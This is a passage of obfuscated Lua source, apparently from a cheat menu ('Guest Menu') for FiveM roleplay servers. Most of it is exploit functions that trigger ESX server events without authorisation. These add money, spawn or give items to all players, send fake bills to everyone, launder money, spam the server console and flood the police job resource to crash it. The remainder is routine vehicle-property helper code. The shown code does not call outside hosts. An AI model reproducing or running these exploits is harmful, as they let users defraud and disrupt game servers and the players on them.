                I.functions.f1d4856a114a6894f5812bb126a541b("99kr-burglary")
         then
            I.exploitthing(true, true, "99kr-burglary:addMoney", kB)
            I.exploitthing(true, true, "burglary:money", kB)
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_minerjob") or
                I.functions.f1d4856a114a6894f5812bb126a541b("esx_miner") or
                I.functions.f1d4856a114a6894f5812bb126a541b("esx_mining")
         then
            I.exploitthing(true, true, "esx_mining:getItem")
            I.exploitthing(true, true, "esx_mining:sell")
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_fishing") or
                I.functions.f1d4856a114a6894f5812bb126a541b("loffe-fishing") or
                I.functions.f1d4856a114a6894f5812bb126a541b("james_fishing")
         then
            I.exploitthing(true, true, "esx_fishing:caughtFish")
            I.exploitthing(true, true, "loffe-fishing:giveFish")
            I.exploitthing(true, true, "loffe-fishing:sellFish")
            I.Guestdata.ESX.TriggerServerCallback(
                "james_fishing:receiveFish",
                function(kE)
                    if kE then
                        o("received fish")
                    end
                end
            )
            I.Guestdata.ESX.TriggerServerCallback(
                "james_fishing:sellFish",
                function(kF, kG)
                    if kF then
                        o("sold " .. kG)
                    end
                end
            )
        end
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_mugging") then
            I.exploitthing(true, true, "esx_mugging:giveMoney", kB)
        end
        if I.functions.f1d4856a114a6894f5812bb126a541b("loffe_robbery") then
            I.exploitthing(true, true, "loffe_robbery:pickUp", kD)
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_prisonwork") or
                I.functions.f1d4856a114a6894f5812bb126a541b("loffe_prisonwork")
         then
            I.exploitthing(true, true, "esx_loffe_fangelse:Pay")
        end
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_robnpc") then
            I.exploitthing(true, true, "esx_robnpc:giveMoney")
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("MF_DrugSales") or
                I.functions.f1d4856a114a6894f5812bb126a541b("MF_drugsales") or
                I.functions.f1d4856a114a6894f5812bb126a541b("ESX_DrugSales")
         then
            I.exploitthing(true, true, "MF_DrugSales:Sold", "water", kB, kD)
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("lenzh_chopshop") or
                I.functions.f1d4856a114a6894f5812bb126a541b("esx_chopshop")
         then
            I.exploitthing(true, true, "lenzh_chopshop:rewards")
            I.exploitthing(true, true, "lenzh_chopshop:sell", "battery", 5)
            I.exploitthing(true, true, "lenzh_chopshop:sell", "lowradio", 5)
            I.exploitthing(true, true, "lenzh_chopshop:sell", "stockrim", 5)
            I.exploitthing(true, true, "lenzh_chopshop:sell", "highrim", 5)
            I.exploitthing(true, true, "lenzh_chopshop:sell", "highradio", 5)
            I.exploitthing(true, true, "lenzh_chopshop:sell", "airbag", 5)
        end
        if I.functions.f1d4856a114a6894f5812bb126a541b("ESX_Deliveries") then
            I.exploitthing(true, true, "esx_deliveries:AddCashMoney", kB)
            I.exploitthing(true, true, "esx_deliveries:AddBankMoney", kB)
            I.exploitthing(true, true, "esx_deliveries:finishDelivery:server")
        end
        if I.functions.f1d4856a114a6894f5812bb126a541b("ESX_Cargodelivery") then
            I.Guestdata.ESX.TriggerServerCallback(
                "esx_cargodelivery:sellCargo",
                function(kE)
                    if kE then
                        o("received " .. kB)
                    end
                end,
                kB
            )
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("napadtransport") or
                I.functions.f1d4856a114a6894f5812bb126a541b("Napad_transport_z_gotowka") or
                I.functions.f1d4856a114a6894f5812bb126a541b("esx_truck_robbery")
         then
            I.exploitthing(true, true, "napadtransport:graczZrobilnapad")
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("napadnakase") or
                I.functions.f1d4856a114a6894f5812bb126a541b("Napad_na_kase")
         then
            I.exploitthing(true, true, "tost:zgarnijsiano")
        end
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("utk_oh") or
                I.functions.f1d4856a114a6894f5812bb126a541b("utk_ornateheist") or
                I.functions.f1d4856a114a6894f5812bb126a541b("aurora_principalbank")
         then
            I.exploitthing(true, true, "utk_oh:rewardCash")
            I.exploitthing(true, true, "utk_oh:rewardGold")
            I.exploitthing(true, true, "utk_oh:rewardDia")
            I.exploitthing(true, true, "utk_oh:giveidcard")
        end
    end
end
I.functions.exploits.esx_give_something = function(kH, kI, kJ)
    local h4 = I.natives.GetActivePlayers()
    for b7 = 1, #h4 do
        I.exploitthing(true, true, "esx:giveInventoryItem", GetPlayerServerId(h4[b7]), kH, kI, kJ)
    end
end
I.functions.exploits.esx_moneywash = function()
    local fl = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter amount of money", "", 12)
    if not I.functions.game.isNullOrEmpty(fl) then
        if
            I.functions.f1d4856a114a6894f5812bb126a541b("esx_blanchisseur") or
                I.functions.f1d4856a114a6894f5812bb126a541b("esx_moneywash")
         then
            I.exploitthing(true, true, "esx_blanchisseur:washMoney", fl)
            I.exploitthing(true, true, "esx_moneywash:washMoney", fl)
            I.exploitthing(true, true, "esx_moneywash:withdraw", fl)
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Please enter a valid amount of money!", 0)
    end
end
I.functions.exploits.esx_harvest_stop = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
        I.exploitthing(true, true, "esx_drugs:stopHarvestWeed")
        I.exploitthing(true, true, "esx_drugs:stopTransformWeed")
        I.exploitthing(true, true, "esx_drugs:stopHarvestOpium")
        I.exploitthing(true, true, "esx_drugs:stopTransformOpium")
        I.exploitthing(true, true, "esx_drugs:stopHarvestMeth")
        I.exploitthing(true, true, "esx_drugs:stopTransformMeth")
        I.exploitthing(true, true, "esx_drugs:stopHarvestCoke")
        I.exploitthing(true, true, "esx_drugs:stopTransformCoke")
    end
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_illegal_drugs") then
        I.exploitthing(true, true, "esx_illegal_drugs:stopHarvestWeed")
        I.exploitthing(true, true, "esx_illegal_drugs:stopTransformWeed")
        I.exploitthing(true, true, "esx_illegal_drugs:stopHarvestOpium")
        I.exploitthing(true, true, "esx_illegal_drugs:stopTransformOpium")
        I.exploitthing(true, true, "esx_illegal_drugs:stopHarvestMeth")
        I.exploitthing(true, true, "esx_illegal_drugs:stopTransformMeth")
        I.exploitthing(true, true, "esx_illegal_drugs:stopHarvestCoke")
        I.exploitthing(true, true, "esx_illegal_drugs:stopTransformCoke")
    end
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_mechanicjob") then
        I.exploitthing(true, true, "esx_mechanicjob:stopHarvest")
        I.exploitthing(true, true, "esx_mechanicjob:stopHarvest2")
        I.exploitthing(true, true, "esx_mechanicjob:stopHarvest3")
        I.exploitthing(true, true, "esx_mechanicjob:stopCraft")
        I.exploitthing(true, true, "esx_mechanicjob:stopCraft2")
        I.exploitthing(true, true, "esx_mechanicjob:stopCraft3")
    end
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_mecanojob") then
        I.exploitthing(true, true, "esx_mecanojob:stopHarvest")
        I.exploitthing(true, true, "esx_mecanojob:stopHarvest2")
        I.exploitthing(true, true, "esx_mecanojob:stopHarvest3")
        I.exploitthing(true, true, "esx_mecanojob:stopCraft")
        I.exploitthing(true, true, "esx_mecanojob:stopCraft2")
        I.exploitthing(true, true, "esx_mecanojob:stopCraft3")
    end
end
I.functions.exploits.esx_outlawalert = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_outlawalert") then
        I.exploitthing(
            true,
            true,
            "esx_outlawalert:gunshotInProgress",
            {x = 1337, y = 1337, z = 1337},
            "GuestCheats",
            0
        )
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_billing = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_billing") then
        local fQ =
            I.NewFunction.c9f328ef7b30553a6705e827855bd30c(
            "Enter bill name",
            "GuestCheats",
            32
        )
        local fP = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter bill amount", "", 16)
        for b7 = 0, #I.natives.GetActivePlayers() do
            if I.functions.game.isNullOrEmpty(fQ) then
                fQ = "GuestCheats > all"
            end
            if I.functions.game.isNullOrEmpty(fP) then
                fP = 5391
            end
            I.exploitthing(
                true,
                true,
                "esx_billing:sendBill",
                GetPlayerServerId(b7),
                "GuestCheats",
                fQ,
                fP
            )
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_policejob_crash = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_policejob") then
        d.Main.GuestThread(
            function()
                for b7 = 1, 50, 1 do
                    I.exploitthing(true, true, "esx_policejob:spawned")
                end
            end
        )
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_spawncustomitem = function()
    local kK = I.NewFunction.c9f328ef7b30553a6705e827855bd30c("Enter Item Name", "", 15)
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_jobs") then
        if not I.functions.game.isNullOrEmpty(kK) then
            local kL = {
                {
                    name = kK,
                    db_name = kK,
                    time = 100,
                    max = 100,
                    add = 1,
                    remove = 10,
                    drop = 100,
                    requires = "nothing",
                    requires_name = "Nothing"
                }
            }
            d.Main.GuestThread(
                function()
                    I.exploitthing(false, true, "esx_jobs:startWork", kL)
                    d.Main.GuestWait(100)
                    I.exploitthing(false, true, "esx_jobs:stopWork", kL)
                end
            )
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
    local kM = {
        "esx_mechanicjob",
        "esx_mecanojob",
        "esx_taxijob",
        "esx_vehicleshop",
        "esx_gangjob",
        "esx_mafiajob",
        "esx_carteljob",
        "esx_bikerjob"
    }
    if not I.functions.game.isNullOrEmpty(kK) then
        for b7 = 1, #kM do
            if I.functions.f1d4856a114a6894f5812bb126a541b(kM[b7]) then
                d.Main.GuestThread(
                    function()
                        I.exploitthing(true, true, kM[b7] .. ":getStockItem", kK, 100)
                        I.exploitthing(true, true, kM[b7] .. ":putStockItems", kK, -100)
                    end
                )
            end
        end
    end
end
I.functions.exploits.esx_spawncustomitems = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_jobs") then
        local kN = I.menuTables.customExploitableItems.Item[ea]
        local kO = I.menuTables.customExploitableItems.ItemDatabase[kN]
        if type(kO) == "table" then
            d.Main.GuestThread(
                function()
                    for aM, bb in pairs(kO) do
                        local kP = I.menuTables.customExploitableItems.ItemRequires[aM]
                        local kL = {
                            {
                                name = aM,
                                db_name = bb,
                                time = 100,
                                max = 1337,
                                add = 1,
                                remove = 10,
                                drop = 100,
                                requires = kP and kO[kP] or "nothing",
                                requires_name = kP and kP or "Nothing"
                            }
                        }
                        d.Main.GuestThread(
                            function()
                                I.exploitthing(false, true, "esx_jobs:startWork", kL)
                                d.Main.GuestWait(1000)
                                I.exploitthing(false, true, "esx_jobs:stopWork", kL)
                            end
                        )
                        d.Main.GuestWait(3000)
                    end
                end
            )
        else
            local kP = I.menuTables.customExploitableItems.ItemRequires[kN]
            local kL = {
                {
                    name = kN,
                    db_name = kO,
                    time = 100,
                    max = 100,
                    add = 1,
                    remove = 10,
                    drop = 100,
                    requires = kP and I.menuTables.customExploitableItems.ItemDatabase[kP] or "nothing",
                    requires_name = kP and kP or "Nothing"
                }
            }
            d.Main.GuestThread(
                function()
                    I.exploitthing(false, true, "esx_jobs:startWork", kL)
                    d.Main.GuestWait(100)
                    I.exploitthing(false, true, "esx_jobs:stopWork", kL)
                end
            )
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_jobitems = function()
    if I.functions.f1d4856a114a6894f5812bb126a541b("esx_jobs") then
        local kN = I.menuTables.exploitableJobsTable.Item[e6]
        local kO = I.menuTables.exploitableJobsTable.ItemDatabase[kN]
        if type(kO) == "table" then
            d.Main.GuestThread(
                function()
                    for aM, bb in pairs(kO) do
                        local kP = I.menuTables.exploitableJobsTable.ItemRequires[aM]
                        local kL = {
                            {
                                name = aM,
                                db_name = bb,
                                time = 100,
                                max = 1337,
                                add = 10,
                                remove = 10,
                                drop = 100,
                                requires = kP and kO[kP] or "nothing",
                                requires_name = kP and kP or "Nothing"
                            }
                        }
                        d.Main.GuestThread(
                            function()
                                I.exploitthing(false, true, "esx_jobs:startWork", kL)
                                d.Main.GuestWait(1000)
                                I.exploitthing(false, true, "esx_jobs:stopWork", kL)
                            end
                        )
                        d.Main.GuestWait(3000)
                    end
                end
            )
        else
            local kP = I.menuTables.exploitableJobsTable.ItemRequires[kN]
            local kL = {
                {
                    name = kN,
                    db_name = kO,
                    time = 100,
                    max = 1337,
                    add = 10,
                    remove = 10,
                    drop = 100,
                    requires = kP and I.menuTables.exploitableJobsTable.ItemDatabase[kP] or "nothing",
                    requires_name = kP and kP or "Nothing"
                }
            }
            d.Main.GuestThread(
                function()
                    I.exploitthing(false, true, "esx_jobs:startWork", kL)
                    d.Main.GuestWait(100)
                    I.exploitthing(false, true, "esx_jobs:stopWork", kL)
                end
            )
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~Resource was not found!", 0)
    end
end
I.functions.exploits.esx_harvestitems = function()
    if e8 == 1 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
            I.exploitthing(true, true, "esx_drugs:startHarvestWeed")
            I.exploitthing(true, true, "esx_drugs:startTransformWeed")
            I.exploitthing(true, true, "esx_drugs:pickedUpCannabis")
            I.exploitthing(true, true, "esx_drugs:processCannabis")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_illegal_drugs") then
            I.exploitthing(true, true, "esx_illegal_drugs:startHarvestWeed")
            I.exploitthing(true, true, "esx_illegal_drugs:startTransformWeed")
        end
    elseif e8 == 2 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
            I.exploitthing(true, true, "esx_drugs:startHarvestOpium")
            I.exploitthing(true, true, "esx_drugs:startTransformOpium")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_illegal_drugs") then
            I.exploitthing(true, true, "esx_illegal_drugs:startHarvestOpium")
            I.exploitthing(true, true, "esx_illegal_drugs:startTransformOpium")
        end
    elseif e8 == 3 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
            I.exploitthing(true, true, "esx_illegal_drugs:startHarvestMeth")
            I.exploitthing(true, true, "esx_illegal_drugs:startTransformMeth")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_illegal_drugs") then
            I.exploitthing(true, true, "esx_drugs:startHarvestMeth")
            I.exploitthing(true, true, "esx_drugs:startTransformMeth")
        end
    elseif e8 == 4 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_drugs") then
            I.exploitthing(true, true, "esx_drugs:startHarvestCoke")
            I.exploitthing(true, true, "esx_drugs:startTransformCoke")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_illegal_drugs") then
            I.exploitthing(true, true, "esx_illegal_drugs:startHarvestCoke")
            I.exploitthing(true, true, "esx_illegal_drugs:startTransformCoke")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("erratic_coke") then
            I.exploitthing(true, true, "coke:GiveItem")
            I.exploitthing(true, true, "coke:GiveItem")
            I.exploitthing(true, true, "coke:processed")
        end
    end
    if e8 == 5 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_mechanicjob") then
            I.exploitthing(true, true, "esx_mechanicjob:startHarvest")
            I.exploitthing(true, true, "esx_mechanicjob:startCraft")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_mecanojob") then
            I.exploitthing(true, true, "esx_mecanojob:startHarvest")
            I.exploitthing(true, true, "esx_mecanojob:startCraft")
        end
    elseif e8 == 6 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_mechanicjob") then
            I.exploitthing(true, true, "esx_mechanicjob:startHarvest2")
            I.exploitthing(true, true, "esx_mechanicjob:startCraft2")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_mecanojob") then
            I.exploitthing(true, true, "esx_mecanojob:startHarvest2")
            I.exploitthing(true, true, "esx_mecanojob:startCraft2")
        end
    elseif e8 == 7 then
        if I.functions.f1d4856a114a6894f5812bb126a541b("esx_mechanicjob") then
            I.exploitthing(true, true, "esx_mechanicjob:startHarvest3")
            I.exploitthing(true, true, "esx_mechanicjob:startCraft3")
        elseif I.functions.f1d4856a114a6894f5812bb126a541b("esx_mecanojob") then
            I.exploitthing(true, true, "esx_mecanojob:startHarvest3")
            I.exploitthing(true, true, "esx_mecanojob:startCraft3")
        end
    end
end
I.functions.exploits.esx_spam_server_console = function()
    if I.Guestdata.ESX ~= nil then
        for b7 = 4, 9 do
            I.Guestdata.ESX.TriggerServerCallback(
                "^" ..
                    b7 ..
                        "d" ..
                            "opamine" ..
                                d.Main.GuestMath.GuestRand(
                                    5000,
                                    10000
                                ),
                function(fR)
                end
            )
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~ESX was not found", 0)
    end
end
I.functions.game = {}
I.functions.game.isNullOrEmpty = function(kQ)
    return kQ == nil or kQ == ""
end
I.functions.game.subtitle = function(c9, kR, kS)
    if kR == nil then
        kR = 2500
    end
    if kS == nil then
        kS = true
    end
    ClearPrints()
    SetTextEntry_2("STRING")
    for b7 = 1, c9:len(), 99 do
        I.natives.addTextComponentSubstringPlayerName(
            d.Main.GuestString.GuestSub(
                c9,
                b7,
                b7 + 99
            )
        )
    end
    b56c29383a6b8f4877Timed(kR, kS)
end
I.functions.game.getVehicles = function()
    local ib = {}
    for X in I.NewFunction.sdkfhdshfbdsfhbsaaae() do
        d.Main.GuestTable.GuestInsert(
            ib,
            X
        )
    end
    return ib
end
I.functions.game.getVehiclesInArea = function(coords, kT)
    local ib = I.functions.game.getVehicles()
    local kU = {}
    for b7 = 1, #ib, 1 do
        local kV = GetEntityCoords(ib[b7])
        local distance = GetDistanceBetweenCoords(kV, coords.x, coords.y, coords.z, true)
        if distance <= kT then
            d.Main.GuestTable.GuestInsert(
                kU,
                ib[b7]
            )
        end
    end
    return kU
end
I.functions.game.driftSmoke = function(kW, kX, kY, kZ, av)
    all_part = {}
    for b7 = 0, kZ do
        UseParticleFxAssetNextCall(kW)
        W1 =
            StartParticleFxLoopedOnEntityBone(
            kX,
            kY,
            0.05,
            0,
            0,
            0,
            0,
            0,
            GetEntityBoneIndexByName(kY, "wheel_lr"),
            av,
            0,
            0,
            0
        )
        UseParticleFxAssetNextCall(kW)
        W2 =
            StartParticleFxLoopedOnEntityBone(
            kX,
            kY,
            0.05,
            0,
            0,
            0,
            0,
            0,
            GetEntityBoneIndexByName(kY, "wheel_rr"),
            av,
            0,
            0,
            0
        )
        d.Main.GuestTable.GuestInsert(
            all_part,
            1,
            W1
        )
        d.Main.GuestTable.GuestInsert(
            all_part,
            2,
            W2
        )
    end
    d.Main.GuestWait(1000)
    for cd, W1 in pairs(all_part) do
        StopParticleFxLooped(W1, true)
    end
end
I.functions.game.vehicleAngle = function(veh)
    if not veh then
        return false
    end
    local k_, l0, l1 =
        d.Main.GuestTable.GuestUnPack(
        GetEntityVelocity(veh)
    )
    local l2 =
        d.Main.GuestMath.GuestSqrt(
        k_ * k_ + l0 * l0
    )
    local l3, l4, l5 =
        d.Main.GuestTable.GuestUnPack(
        GetEntityRotation(veh, 0)
    )
    local l6, hi =
        -d.Main.GuestMath.GuestSin(
            d.Main.GuestMath.GuestRad(
                l5
            )
        ),
        d.Main.GuestMath.GuestCos(
            d.Main.GuestMath.GuestRad(
                l5
            )
        )
    if GetEntitySpeed(veh) * 3.6 < 5 or GetVehicleCurrentGear(veh) == 0 then
        return 0, l2
    end
    local l7 = (l6 * k_ + hi * l0) / l2
    if l7 > 0.966 or l7 < 0 then
        return 0, l2
    end
    return math.deg(math.acos(l7)) * 0.5, l2
end
I.functions.initializeUpgradesTab = function()
    local go = I.Guestdata.pLocalPlayer.cVehicle
    if go then
        for b7, eN in pairs(I.menuTables.vehiclePerformanceTable) do
            if I.menuButton(eN.name, "vehicleLosSantosCustomsPerformance" .. eN.name) then
            end
        end
    end
end
I.functions.game.getVehicleProperties = function(X)
    if DoesEntityExist(X) then
        local l8, l9 = GetVehicleColours(X)
        local la, lb = GetVehicleExtraColours(X)
        local lc = {}
        for aW = 0, 12 do
            if I.natives.doesExtraExist(X, aW) then
                local aD = IsVehicleExtraTurnedOn(X, aW) == 1
                lc[d.Main.GuestToString(aW)] = aD
            end
        end
        return {
            model = GetEntityModel(X),
            plate = I.functions.Math.Trim(GetVehicleNumberPlateText(X)),
            plateIndex = GetVehicleNumberPlateTextIndex(X),
            bodyHealth = I.functions.Math.Round(GetVehicleBodyHealth(X), 1),
            engineHealth = I.functions.Math.Round(GetVehicleEngineHealth(X), 1),
            fuelLevel = I.functions.Math.Round(GetVehicleFuelLevel(X), 1),
            dirtLevel = I.functions.Math.Round(GetVehicleDirtLevel(X), 1),
            color1 = l8,
            color2 = l9,
            pearlescentColor = la,
            wheelColor = lb,
            wheels = GetVehicleWheelType(X),
            windowTint = GetVehicleWindowTint(X),
            xenonColor = I.natives.getVehicleXenonLightsColour(X),
            neonEnabled = {
                IsVehicleNeonLightEnabled(X, 0),
                IsVehicleNeonLightEnabled(X, 1),
                IsVehicleNeonLightEnabled(X, 2),
                IsVehicleNeonLightEnabled(X, 3)
            },
            neonColor = d.Main.GuestTable.GuestPack(
                GetVehicleNeonLightsColour(X)
            ),
            extras = lc,
            tyreSmokeColor = d.Main.GuestTable.GuestPack(
                GetVehicleTyreSmokeColor(X)
            ),
            modSpoilers = GetVehicleMod(X, 0),
            modFrontBumper = GetVehicleMod(X, 1),
            modRearBumper = GetVehicleMod(X, 2),
            modSideSkirt = GetVehicleMod(X, 3),
            modExhaust = GetVehicleMod(X, 4),
            modFrame = GetVehicleMod(X, 5),
            modGrille = GetVehicleMod(X, 6),
            modHood = GetVehicleMod(X, 7),
            modFender = GetVehicleMod(X, 8),
            modRightFender = GetVehicleMod(X, 9),
            modRoof = GetVehicleMod(X, 10),
            modEngine = GetVehicleMod(X, 11),
            modBrakes = GetVehicleMod(X, 12),
            modTransmission = GetVehicleMod(X, 13),
            modHorns = GetVehicleMod(X, 14),
            modSuspension = GetVehicleMod(X, 15),
            modArmor = GetVehicleMod(X, 16),
            modTurbo = IsToggleModOn(X, 18),
            modSmokeEnabled = IsToggleModOn(X, 20),
            modXenon = IsToggleModOn(X, 22),
            modFrontWheels = GetVehicleMod(X, 23),
            modBackWheels = GetVehicleMod(X, 24),
            modPlateHolder = GetVehicleMod(X, 25),
            modVanityPlate = GetVehicleMod(X, 26),
            modTrimA = GetVehicleMod(X, 27),
            modOrnaments = GetVehicleMod(X, 28),
            modDashboard = GetVehicleMod(X, 29),
            modDial = GetVehicleMod(X, 30),
            modDoorSpeaker = GetVehicleMod(X, 31),
            modSeats = GetVehicleMod(X, 32),
            modSteeringWheel = GetVehicleMod(X, 33),
            modShifterLeavers = GetVehicleMod(X, 34),
            modAPlate = GetVehicleMod(X, 35),
            modSpeakers = GetVehicleMod(X, 36),
            modTrunk = GetVehicleMod(X, 37),
            modHydrolic = GetVehicleMod(X, 38),
            modEngineBlock = GetVehicleMod(X, 39),
            modAirFilter = GetVehicleMod(X, 40),
            modStruts = GetVehicleMod(X, 41),
            modArchCover = GetVehicleMod(X, 42),
            modAerials = GetVehicleMod(X, 43),
            modTrimB = GetVehicleMod(X, 44),
            modTank = GetVehicleMod(X, 45),
            modWindows = GetVehicleMod(X, 46),
            modLivery = GetVehicleLivery(X),
            suspensionRaise = GetVehicleHandlingFloat(X, "CHandlingData", "fSuspensionRaise")
        }
    else
        return
    end
end
I.functions.game.setVehicleProperties = function(X, ld)
    if DoesEntityExist(X) then
        local l8, l9 = GetVehicleColours(X)
        local la, lb = GetVehicleExtraColours(X)
        SetVehicleModKit(X, 0)
        if ld.plate then
            SetVehicleNumberPlateText(X, ld.plate)
        end
        if ld.plateIndex then
            SetVehicleNumberPlateTextIndex(X, ld.plateIndex)
        end
        if ld.bodyHealth then
            SetVehicleBodyHealth(X, ld.bodyHealth + 0.0)
        end
        if ld.engineHealth then
            SetVehicleEngineHealth(X, ld.engineHealth + 0.0)
        end
        if ld.fuelLevel then
            SetVehicleFuelLevel(X, ld.fuelLevel + 0.0)
        end
        if ld.dirtLevel then
            SetVehicleDirtLevel(X, ld.dirtLevel + 0.0)
        end
        if ld.color1 then
            SetVehicleColours(X, ld.color1, l9)
        end
        if ld.color2 then
            SetVehicleColours(X, ld.color1 or l8, ld.color2)
        end
        if ld.pearlescentColor then
            SetVehicleExtraColours(X, ld.pearlescentColor, lb)
        end
        if ld.wheelColor then
            SetVehicleExtraColours(X, ld.pearlescentColor or la, ld.wheelColor)
        end
        if ld.wheels then
            SetVehicleWheelType(X, ld.wheels)
        end
        if ld.windowTint then
            SetVehicleWindowTint(X, ld.windowTint)
        end
        if ld.neonEnabled then
            SetVehicleNeonLightEnabled(X, 0, ld.neonEnabled[1])
            SetVehicleNeonLightEnabled(X, 1, ld.neonEnabled[2])
            SetVehicleNeonLightEnabled(X, 2, ld.neonEnabled[3])
            SetVehicleNeonLightEnabled(X, 3, ld.neonEnabled[4])
        end
        if ld.extras then
            for aW, le in pairs(ld.extras) do
                if le then
                    SetVehicleExtra(X, d.Main.GuestToNum(aW), 0)
                else
                    SetVehicleExtra(X, d.Main.GuestToNum(aW), 1)
                end
            end
        end
        if ld.neonColor then
            SetVehicleNeonLightsColour(X, ld.neonColor[1], ld.neonColor[2], ld.neonColor[3])
        end
        if ld.xenonColor then
            I.natives.setVehicleXenonLightsColour(X, ld.xenonColor)
        end
        if ld.modSmokeEnabled then
            ToggleVehicleMod(X, 20, true)
        end
        if ld.tyreSmokeColor then
            SetVehicleTyreSmokeColor(X, ld.tyreSmokeColor[1], ld.tyreSmokeColor[2], ld.tyreSmokeColor[3])
        end
        if ld.modSpoilers then
            SetVehicleMod(X, 0, ld.modSpoilers, false)
        end
        if ld.modFrontBumper then
            SetVehicleMod(X, 1, ld.modFrontBumper, false)
        end
        if ld.modRearBumper then
            SetVehicleMod(X, 2, ld.modRearBumper, false)
        end
        if ld.modSideSkirt then
            SetVehicleMod(X, 3, ld.modSideSkirt, false)
        end
        if ld.modExhaust then
            SetVehicleMod(X, 4, ld.modExhaust, false)
        end
        if ld.modFrame then
            SetVehicleMod(X, 5, ld.modFrame, false)
        end
        if ld.modGrille then
            SetVehicleMod(X, 6, ld.modGrille, false)
        end
        if ld.modHood then
            SetVehicleMod(X, 7, ld.modHood, false)
        end
        if ld.modFender then
            SetVehicleMod(X, 8, ld.modFender, false)
        end
        if ld.modRightFender then
            SetVehicleMod(X, 9, ld.modRightFender, false)
        end
        if ld.modRoof then
            SetVehicleMod(X, 10, ld.modRoof, false)
        end
        if ld.modEngine then
            SetVehicleMod(X, 11, ld.modEngine, false)
        end
        if ld.modBrakes then
            SetVehicleMod(X, 12, ld.modBrakes, false)
        end
        if ld.modTransmission then
            SetVehicleMod(X, 13, ld.modTransmission, false)
        end
        if ld.modHorns then
            SetVehicleMod(X, 14, ld.modHorns, false)
        end
        if ld.modSuspension then
            SetVehicleMod(X, 15, ld.modSuspension, false)
        end
        if ld.modArmor then
            SetVehicleMod(X, 16, ld.modArmor, false)
        end
        if ld.modTurbo then
            ToggleVehicleMod(X, 18, ld.modTurbo)
        end
        if ld.modXenon then
            ToggleVehicleMod(X, 22, ld.modXenon)
        end
        if ld.modFrontWheels then
            SetVehicleMod(X, 23, ld.modFrontWheels, false)
        end
        if ld.modBackWheels then
            SetVehicleMod(X, 24, ld.modBackWheels, false)
        end
        if ld.modPlateHolder then
            SetVehicleMod(X, 25, ld.modPlateHolder, false)
        end
        if ld.modVanityPlate then
            SetVehicleMod(X, 26, ld.modVanityPlate, false)
        end
        if ld.modTrimA then
            SetVehicleMod(X, 27, ld.modTrimA, false)
        end
        if ld.modOrnaments then
            SetVehicleMod(X, 28, ld.modOrnaments, false)
        end
        if ld.modDashboard then
            SetVehicleMod(X, 29, ld.modDashboard, false)
        end
        if ld.modDial then
            SetVehicleMod(X, 30, ld.modDial, false)
        end
        if ld.modDoorSpeaker then
            SetVehicleMod(X, 31, ld.modDoorSpeaker, false)
        end
        if ld.modSeats then
            SetVehicleMod(X, 32, ld.modSeats, false)
        end
        if ld.modSteeringWheel then
            SetVehicleMod(X, 33, ld.modSteeringWheel, false)
        end
        if ld.modShifterLeavers then
            SetVehicleMod(X, 34, ld.modShifterLeavers, false)
        end
        if ld.modAPlate then
            SetVehicleMod(X, 35, ld.modAPlate, false)
        end
        if ld.modSpeakers then
            SetVehicleMod(X, 36, ld.modSpeakers, false)
        end
        if ld.modTrunk then
            SetVehicleMod(X, 37, ld.modTrunk, false)
        end
        if ld.modHydrolic then
            SetVehicleMod(X, 38, ld.modHydrolic, false)
        end
        if ld.modEngineBlock then
            SetVehicleMod(X, 39, ld.modEngineBlock, false)
        end
        if ld.modAirFilter then
            SetVehicleMod(X, 40, ld.modAirFilter, false)
        end
        if ld.modStruts then
            SetVehicleMod(X, 41, ld.modStruts, false)
        end
        if ld.modArchCover then
            SetVehicleMod(X, 42, ld.modArchCover, false)
        end
        if ld.modAerials then
            SetVehicleMod(X, 43, ld.modAerials, false)
        end
        if ld.modTrimB then
            SetVehicleMod(X, 44, ld.modTrimB, false)
        end
        if ld.modTank then
            SetVehicleMod(X, 45, ld.modTank, false)
        end
        if ld.modWindows then
            SetVehicleMod(X, 46, ld.modWindows, false)
        end
        if ld.modLivery then
            SetVehicleMod(X, 48, ld.modLivery, false)
            SetVehicleLivery(X, ld.modLivery)
        end
